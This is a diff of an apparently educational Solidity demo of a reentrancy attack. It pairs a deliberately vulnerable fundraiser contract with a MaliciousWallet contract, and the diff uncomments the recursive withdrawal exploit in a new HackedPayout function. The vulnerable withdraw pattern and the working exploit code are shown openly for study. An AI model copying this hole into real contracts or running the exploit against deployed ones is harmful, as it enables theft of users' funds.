@@ -1,15 +1,19 @@
-pragma solidity ^0.4.0;
+pragma solidity ^0.4.16;
 
-contract VulnerableFundraiser{
+contract VulnerableFundraiser {
 
     mapping(address=>uint) balances;
 
-    function VulnerableFundraiser() payable {
+    function VulnerableFundraiser(address fundraiserAddress)  payable public {
         
     }
+    
 
     // VULNERABLE
-    function withdrawAllMyCoins() payable{
+    function withdrawAllMyCoins() payable public {
+    
+        // With the Fix that was fixed on PR 242 over at the DAO
+        // https://github.com/slockit/DAO/pull/242/files
     
         uint widthdrawAmout = balances[msg.sender];
         MaliciousWallet wallet = MaliciousWallet(msg.sender);
@@ -19,16 +23,16 @@ contract VulnerableFundraiser{
     
     }
 
-    function getBalance() constant returns (uint) {
+    function getBalance() constant public returns (uint) {
         return this.balance;
     }
     
-    function contribute() payable {
+    function contribute() payable public {
         balances[msg.sender] = msg.value;
     }
         
         
-    function() payable {
+    function() payable public {
     
         
     }
@@ -40,37 +44,42 @@ contract MaliciousWallet {
     VulnerableFundraiser fundraiser;
     uint recursions = 10;
     
-    function MaliciousWallet(address fundraiserAddress) payable {
-        fundraiser = VulnerableFundraiser(fundraiserAddress);
+    function MaliciousWallet(address fundraiserAddress) payable public {
+    fundraiser = VulnerableFundraiser(fundraiserAddress);
     }
     
-    function contribute(uint amount) {
+    function  contribute(uint amount) public {
+        
         fundraiser.contribute.value(amount)();
     }
     
-    function widthDraw() {
+    function widthDraw() public {
        fundraiser.withdrawAllMyCoins();
     }
     
-    function getBalance() constant returns (uint) {
+    function getBalance() constant public returns (uint)  {
         return this.balance;
     }
     
-    function payout() payable { 
+    function payout()  payable public { 
+    
+        // Gegular Payout
+        fundraiser.withdrawAllMyCoins(); // Hey before you set my balance to 0 give me more!
+    }
+
+    function HackedPayout()  payable public { 
     
         //exploit - using recursion
-        /*
         
         if (recursions > 0) { // Don't loop forever
             recursions--;
             fundraiser.withdrawAllMyCoins(); // Hey before you set my balance to 0 give me more!
         }
         
-        */
     
     }
     
-    function()  payable {
+    function()  payable public {
     
         
     }
